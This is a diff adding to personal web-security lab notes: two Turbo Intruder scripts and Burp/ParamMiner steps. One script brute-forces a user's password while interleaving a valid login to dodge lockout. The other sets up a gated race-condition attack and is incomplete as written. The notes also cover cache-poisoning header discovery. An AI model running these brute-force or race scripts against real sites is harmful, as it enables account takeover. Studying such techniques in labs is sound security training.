@@ -87,5 +87,52 @@ Stuff that I found, but never read/used yet.
 * Burp Scanner (paid, see HTB notes)
 * Show response in browser
 * Scan insertion points
+
+```py
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=1,
+                           requestsPerConnection=100,
+                           pipeline=False
+                           )
+
+    for word in open('/usr/share/dict/authpwd'):
+        engine.queue(target.req, ["carlos", word.rstrip()], label='carlos')
+        engine.queue(target.req, ["wiener", "peter"])
+
+def handleResponse(req, interesting):
+    if req.status == 302 and req.label == 'carlos':
+        table.add(req)
+```
 </div><div>
+
+```py
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=1,
+                           engine=Engine.BURP2
+                           )
+
+	# 1: %s for username
+	# 2: %s for password
+    for word in []:
+        engine.queue(target.req, ["username", word.rstrip()], gate='race1')
+    engine.openGate('race1')
+
+def handleResponse(req, interesting):
+    table.add(req)
+```
+```text!
+=> record a macro, edit item and add parameter "gift-card"
+=> then tell request 5 to use previous request for parameter "gift-card"
+=> add session rule to trigger to macro and run intruder
+
+=> ParamMiner > Run (extension>output to see the progress) Then Go to Target>Sitemap>ThereUGo
+=> load an image on our domain to get the user-agent and other headers
+=> proc as usual
+
+Headers are ignored in most cache key computations.
+=> ParamMiner => Guess Headers => Issues
+=> +add a cache buster
+```
 </div></div>
